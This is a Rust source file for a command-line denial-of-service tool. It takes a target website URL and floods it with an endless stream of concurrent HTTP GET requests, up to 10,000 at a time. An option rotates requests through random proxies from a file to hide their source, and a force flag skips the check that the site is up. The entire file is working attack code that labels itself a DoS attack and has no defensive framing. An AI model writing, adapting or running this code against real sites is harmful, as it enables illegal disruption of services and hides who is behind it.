#![feature(integer_atomics)]

use chrono::{Local, Timelike};
use clap::Parser;
use colored::Colorize;
use futures::stream::FuturesUnordered;
use futures::StreamExt;
use rand::Rng;

use std::fs::File;
use std::io::{self, BufRead};
use std::path::Path;
use std::sync::atomic::{AtomicU128, Ordering};
use std::sync::Arc;

enum WebsiteError {
    WebsiteUnaccessible,
    BadResponse,
}

/// Denial of Service attack
#[derive(Parser, Debug)]
struct Args {
    /// Website URL to attack
    #[clap(short, long)]
    url: String,

    /// Needs to use proxy servers
    #[clap(short, long, takes_value = false)]
    proxy: bool,

    /// Start DoS without website status checking
    #[clap(short, long, takes_value = false)]
    force: bool,
}

struct DenialOfService {
    url: String,
    spawned_requests: AtomicU128,
    activate_proxy: bool,
}

impl DenialOfService {
    async fn attack(self: &Arc<Self>) {
        let mut proxies = Vec::new();
        if let Ok(lines) = read_lines("./proxies.txt") {
            for line in lines {
                if let Ok(proxy) = line {
                    proxies.push(proxy);
                }
            }
        }

        let mut spawned_tasks = FuturesUnordered::new();
        loop {
            if spawned_tasks.len() > 10000 {
                spawned_tasks.next().await;
            }

            let self_cloned = self.clone();
            if self_cloned.activate_proxy {
                let taken_proxy = take_random_proxy(proxies.clone());
                spawned_tasks.push(tokio::spawn(async move {
                    match reqwest::Proxy::http(taken_proxy.clone()) {
                        Ok(proxy) => match reqwest::Client::builder().proxy(proxy).build() {
                            Ok(client) => match client.get(self_cloned.url.clone()).send().await {
                                Ok(_) => {
                                    self_cloned.spawned_requests.fetch_add(1, Ordering::SeqCst);

                                    if self_cloned.spawned_requests.load(Ordering::SeqCst) % 1000
                                        == 0
                                    {
                                        display_time();

                                        let request_info = format!(
                                            "Request №{} was successfuly sent from",
                                            self_cloned.spawned_requests.load(Ordering::SeqCst),
                                        );
                                        println!("{} {}", request_info.green(), taken_proxy.bold());
                                    }
                                }
                                Err(e) => {
                                    display_time();

                                    let error_string = format!("{}", e);
                                    println!("{}", error_string.red().bold());
                                }
                            },
                            Err(e) => {
                                display_time();

                                let error_string = format!("{}", e);
                                println!("{}", error_string.red().bold());
                            }
                        },
                        Err(e) => {
                            display_time();

                            let error_string = format!("{}", e);
                            println!("{}", error_string.red().bold());
                        }
                    };
                }));
            } else {
                spawned_tasks.push(tokio::spawn(async move {
                    match reqwest::get(self_cloned.url.clone()).await {
                        Ok(_) => {
                            self_cloned.spawned_requests.fetch_add(1, Ordering::SeqCst);

                            if self_cloned.spawned_requests.load(Ordering::SeqCst) % 1000 == 0 {
                                display_time();

                                let request_info = format!(
                                    "Request №{} was successfuly sent",
                                    self_cloned.spawned_requests.load(Ordering::SeqCst),
                                );
                                println!("{}", request_info.green());
                            }
                        }
                        Err(e) => {
                            display_time();

                            let error_string = format!("{}", e);
                            println!("{}", error_string.red().bold());
                        }
                    }
                }));
            }
        }
    }
}

fn display_time() {
    let now = Local::now().time();
    let time = format!(
        "[{:02}:{:02}:{:02}] ",
        now.hour(),
        now.minute(),
        now.second()
    );

    print!("{} ", time.blue());
}

fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>>
where
    P: AsRef<Path>,
{
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}

fn take_random_proxy(proxies: Vec<String>) -> String {
    let mut rng = rand::thread_rng();

    let rand_index = rng.gen_range(0..proxies.len());
    proxies[rand_index].clone()
}

async fn website_is_up(url: String) -> Result<(), WebsiteError> {
    let response = reqwest::get(url).await;

    match response {
        Ok(response_res) => {
            if response_res.status().is_success() {
                return Ok(());
            }

            return Err(WebsiteError::BadResponse);
        }
        Err(_) => return Err(WebsiteError::WebsiteUnaccessible),
    }
}

async fn start_denial_of_service(url: String, activate_proxy: bool) {
    display_time();
    println!("{} {}", "DoS is running at".green(), url.clone().bold());
    Arc::new(DenialOfService {
        url: url.clone(),
        spawned_requests: AtomicU128::new(0),
        activate_proxy,
    })
    .attack()
    .await
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    let website_url = args.url;
    let activate_proxy = args.proxy;

    if args.force {
        start_denial_of_service(website_url.clone(), activate_proxy).await;
    }

    match website_is_up(website_url.clone()).await {
        Ok(()) => {
            start_denial_of_service(website_url.clone(), activate_proxy).await;
        }
        Err(WebsiteError::WebsiteUnaccessible) => {
            display_time();
            println!(
                "{}",
                "Unable to ping website. Make sure the link is spelled correctly!"
                    .red()
                    .bold()
            );
        }
        Err(WebsiteError::BadResponse) => {
            display_time();
            println!(
                "{}",
                "GET request to the site ended with an failure response!"
                    .red()
                    .bold()
            );
        }
    }
}
